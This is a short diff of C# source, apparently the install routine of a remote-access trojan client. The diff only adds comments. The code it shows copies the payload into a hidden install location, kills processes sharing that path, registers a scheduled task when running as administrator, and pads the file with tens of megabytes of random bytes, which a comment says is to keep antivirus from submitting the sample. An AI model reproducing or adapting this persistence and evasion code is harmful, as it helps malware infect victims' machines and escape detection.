@@ -16,7 +16,7 @@ namespace Client.Install
             try
             {
                 FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
-                if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
+                if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName) //check if payload is running from installation path
                 {
 
                     for (int i = 0; i < 10; i++)
@@ -24,7 +24,7 @@ namespace Client.Install
                         Thread.Sleep(1000);
                     }
 
-                    foreach (Process P in Process.GetProcesses())
+                    foreach (Process P in Process.GetProcesses()) //kill any process which shares same path
                     {
                         try
                         {
@@ -33,7 +33,7 @@ namespace Client.Install
                         }
                         catch { }
                     }
-                    if (Methods.IsAdmin())
+                    if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
                     {
                         Process proc = new Process
                         {
@@ -64,6 +64,8 @@ namespace Client.Install
                     fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                     byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                     fs.Write(clientExe, 0, clientExe.Length);
+                    
+                    //prevent AV from sending sample by increasing the payload size
                     byte[] junk = new byte[new Random().Next(40 * 1024 * 1000, 50 * 1024 * 1000)];
                     new Random().NextBytes(junk);
                     fs.Write(junk, 0, junk.Length);
